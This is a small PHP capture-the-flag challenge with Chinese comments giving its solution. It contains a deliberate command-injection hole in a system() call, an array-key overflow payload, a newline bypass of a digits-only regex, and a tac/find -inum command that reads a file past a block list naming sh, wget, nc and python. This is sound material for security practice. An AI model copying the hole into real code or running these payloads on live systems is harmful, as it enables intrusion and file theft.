<?php
//php5.5.9
$stuff = $_GET["stuff"];
$array = ['admin', 'user'];
// payload=stuff[4294967296]=admin&stuff[1]=user [和]可以编码
// 这里用的是PHP的key溢出,php7已经修复
if($stuff === $array && $stuff[0] != 'admin') {
    $num= $_GET["num"];
    // 没有用/i那么只能进行单行匹配,所以用跨行(%0a)来bypass  
    // payload = num=1%0als  
    if (preg_match("/^\d+$/im",$num)){
        // 过滤了不少命令tac是从最下面一行开始的cat
        // ls -i 可以显示文件的索引号,这里的inode=17703600
        // find / - inum $inode 找到对应的文件名
        // payload=num=1%0atac `find / -inum 17703600`
        if (!preg_match("/sh|wget|nc|python|php|perl|\?|flag|}|cat|echo|\*|\^|\]|\\\\|'|\"|\|/i",$num)){
            echo "my favorite num is:";
            system("echo ".$num);
        }else{
            echo 'Bonjour!';
        }
    }
} else {
    highlight_file(__FILE__);
}
?>